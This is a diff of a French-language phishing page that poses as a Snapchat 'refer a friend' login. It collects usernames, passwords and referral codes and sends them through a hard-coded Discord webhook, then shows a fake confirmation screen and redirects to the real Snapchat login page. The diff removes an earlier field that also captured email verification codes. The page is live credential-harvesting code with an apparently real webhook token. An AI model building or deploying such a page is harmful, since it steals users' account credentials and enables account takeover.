@@ -20,7 +20,6 @@
       align-items: center;
       height: 100vh;
     }
-
     .login-box, .image-screen {
       width: 100%;
       max-width: 400px;
@@ -31,25 +30,21 @@
       background-color: #fff;
       color: #000;
     }
-
     .logo {
       width: 80px;
       margin: 0 auto 20px auto;
       display: block;
     }
-
     .form-group {
       text-align: left;
       margin-bottom: 15px;
     }
-
     .form-group label {
       display: block;
       font-size: 13px;
       font-weight: bold;
       margin-bottom: 5px;
     }
-
     .form-group input {
       width: 100%;
       padding: 12px;
@@ -58,7 +53,6 @@
       font-size: 16px;
       box-sizing: border-box;
     }
-
     button {
       background-color: #fffc00;
       border: none;
@@ -71,14 +65,12 @@
       margin-top: 20px;
       font-size: 16px;
     }
-
     .links-container {
       display: flex;
       justify-content: space-between;
       margin-top: 10px;
       font-size: 14px;
     }
-
     .link-button {
       background: transparent;
       border: none;
@@ -87,38 +79,36 @@
       cursor: pointer;
       text-decoration: underline;
     }
-
     #errorMessage,
     #referralError {
       color: red;
       display: none;
       margin-top: 10px;
     }
-
-    #textScreen {
+    #imageScreen {
       display: none;
+    }
+    #imageScreen img {
+      width: 200px; /* taille réduite */
+      border-radius: 10px;
+      display: block;
+      margin: 0 auto;
     }
   </style>
 </head>
-
 <body>
-
-  <!-- LOGIN -->
   <div class="login-box" id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
     <h2>Snapchat | Parrainez Un Ami</h2>
-
     <form id="loginForm">
       <div class="form-group">
         <label for="username">Nom d'utilisateur ou e-mail</label>
         <input type="text" id="username" required />
       </div>
-
       <div class="form-group">
         <label for="password">Mot de passe</label>
         <input type="password" id="password" required />
       </div>
-
       <div class="form-group">
         <label for="referralCode">Code de parrainage</label>
         <input type="text" id="referralCode" required />
@@ -131,37 +121,23 @@
         <button type="button" class="link-button">Mot de passe oublié</button>
       </div>
     </form>
-
     <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="image-screen" id="textScreen">
-  <h3>Confirmez votre adresse e-mail</h3>
-  <p>Saisir le code a 6 chiffre envoyé dans votre boite e-mail</p>
-
-  <div class="form-group">
-    <label for="mail">CodeMail</label>
-    <input type="text" id="mail" required />
+  <div class="image-screen" id="imageScreen">
+    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
   </div>
 
-  <button type="button" id="confirmBtn">Confirmer</button>
-</div>
-
-  <!-- SCRIPT -->
   <script>
-    let mail = "";
     const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
-
-   
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
-      mail = document.getElementById('mail').value.trim();
       const referralCode = document.getElementById('referralCode').value.trim();
 
       const errorMessage = document.getElementById('errorMessage');
@@ -180,24 +156,21 @@
         return;
       }
 
-      if (!mail) {
-        console.log("Mail vide ou non rempli");
-      }
-
       const message = {
-        embeds: [{
-          title: "📥 Nouvelle tentative de connexion",
-          description: "Informations collectées via le formulaire",
-          color: 0xffc800,
-          fields: [
-            { name: "👤 Nom d'utilisateur / e-mail", value: username },
-            { name: "🔒 Mot de passe", value: password },
-            { name: "🎁 Code de parrainage", value: referralCode },
-            { name: "📩 Code mail", value: mail }
-          ],
-          timestamp: new Date().toISOString(),
-          footer: { text: "Formulaire Rankos" }
-        }]
+        embeds: [
+          {
+            title: "📥 Nouvelle tentative de connexion",
+            description: "Informations collectées via le formulaire",
+            color: 0xffc800,
+            fields: [
+              { name: "👤 Nom d'utilisateur / e-mail", value: username },
+              { name: "🔒 Mot de passe", value: password },
+              { name: "🎁 Code de parrainage", value: referralCode }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Formulaire Rankos" }
+          }
+        ]
       };
 
       fetch(webhookURL, {
@@ -205,16 +178,16 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(message),
       })
-      .then(() => {
+      .then(response => {
+        // Après l'envoi, lancer le processus d'affichage et de redirection
         setTimeout(() => {
           document.getElementById('loginBox').style.display = 'none';
-          document.getElementById('textScreen').style.display = 'block';
+          document.getElementById('imageScreen').style.display = 'block';
 
           setTimeout(() => {
             window.location.href = redirectURL;
-          }, 30000);
-
-        }, 1000);
+          }, 30000); // 30 secondes
+        }, 1000); // 1 seconde (modifié)
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
@@ -222,6 +195,5 @@
       });
     });
   </script>
-
 </body>
 </html>
